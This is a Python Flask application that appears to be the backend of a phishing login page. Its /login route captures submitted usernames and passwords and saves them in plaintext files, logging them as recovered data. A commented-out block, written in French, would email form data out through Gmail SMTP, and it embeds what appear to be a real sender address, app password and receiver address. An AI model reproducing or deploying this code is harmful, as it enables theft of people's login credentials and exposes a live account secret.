from flask import Flask, render_template, request, redirect, url_for
import random
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart



app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    os.makedirs("password text", exist_ok=True)
    username = request.form['username']
    password = request.form['password']
    data = f"Username : {username} \nPassword : {password}"

    lettre = "0123456789"
    lenght = 4
    numb = ''.join(random.sample(lettre,lenght))
    chemin = "password text/"+username+numb+'.txt'

    # save data
    with open(chemin,"a") as f:
        f.write(data)
        print('donnée recuperer : ',data)

    '''
    # Tu peux stocker ces infos dans des variables d'environnement
    EMAIL_SENDER = os.getenv('bettybe446@gmail.com')       # tonemail@gmail.com
    EMAIL_PASSWORD = os.getenv('ztjg nsyd wfbm tgog')   # mot de passe d'application Gmail
    EMAIL_RECEIVER = os.getenv('traorefahadaziz446@gmail.com')   # où tu veux recevoir le mail
    
    subject = 'Test Email depuis Flask'
    body = f"Message reçu : {request.form.get('message')}"

    msg = MIMEMultipart()
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        return "✅ Email envoyé !"
    except Exception as e:
        return f"❌ Erreur : {e}"'''

    
    print("Donnée enregistré", data)



if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)

